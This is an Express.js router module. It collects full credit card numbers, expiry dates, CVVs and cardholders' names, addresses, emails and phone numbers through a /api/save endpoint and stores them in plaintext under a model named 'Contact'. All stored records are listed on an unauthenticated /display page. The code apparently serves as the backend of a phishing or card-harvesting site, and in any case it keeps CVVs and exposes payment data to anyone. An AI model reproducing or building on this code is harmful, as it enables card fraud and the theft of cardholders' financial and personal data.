import express from 'express';
import path, { join } from 'path'; // Add { join } here
import bodyParser from 'body-parser';
import { fileURLToPath } from 'url';
import { dirname } from 'path'; // Remove join from here
import Contact from './contact.models.js';
import validator from 'validator';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const router = express.Router();
router.use(bodyParser.urlencoded({ extended: true }));
router.use(bodyParser.json());

// Serve frontend files from the root route
const publicPath = path.join(__dirname, 'public');
router.use(express.static(publicPath));

// Route to serve index.html at the root route
router.get('/', (req, res) => {
    res.sendFile(path.join(publicPath, 'index.html'));
});


// Custom function to validate expiration date in MM/YY format
const isValidExpiryDate = (expiry) => {
    const [month, year] = expiry.split('/').map(Number);
    if (month < 1 || month > 12) return false;
    const currentYear = new Date().getFullYear() % 100; // Get last two digits of current year
    const currentMonth = new Date().getMonth() + 1; // getMonth is 0-indexed
    if (year < currentYear || (year === currentYear && month < currentMonth)) {
        return false;
    }
    return true;
};

router.post('/api/save', async (req, res) => {
    const { card_number, expires, cvv, first_name, last_name, address, apartment, city, state, zip_code, email, phone } = req.body;

    // Validate fields
    if (!validator.isCreditCard(card_number)) {
        return res.status(400).send('Invalid card number');
    }

    if (!isValidExpiryDate(expires)) {
        return res.status(400).send('Invalid expiration date');
    }

    if (!validator.isLength(cvv, { min: 3, max: 4 }) || !validator.isNumeric(cvv)) {
        return res.status(400).send('Invalid CVV');
    }

    if (!validator.isEmail(email)) {
        return res.status(400).send('Invalid email address');
    }

    if (!validator.isMobilePhone(phone, 'any')) { // You can specify locale if needed
        return res.status(400).send('Invalid phone number');
    }

    try {
        const newContact = new Contact({
            card_number,
            expires,
            cvv,
            first_name,
            last_name,
            address,
            apartment,
            city,
            state,
            zip_code,
            email,
            phone
        });

        await newContact.save();
        console.log('Contact saved successfully');
        res.status(200).send('Message saved successfully');
    } catch (error) {
        console.error('Error saving contact:', error);
        res.status(500).send('Error saving contact');
    }
});


// Route to display all contact data
router.get('/display', async (req, res) => {
    try {
        const contacts = await Contact.find();
        res.render('display', { contacts: contacts });
    } catch (error) {
        console.error('Error fetching contacts:', error);
        res.status(500).send('Error fetching contacts');
    }
});

// Route to delete a contact
router.post('/delete/:id', (req, res) => {
    const contactId = req.params.id;
    Contact.findByIdAndDelete(contactId)
        .then(() => {
            console.log('Contact deleted successfully');
            res.redirect('/display');
        })
        .catch(err => {
            console.error(err);
            res.status(500).send('Error deleting contact');
        });
});

export default router;
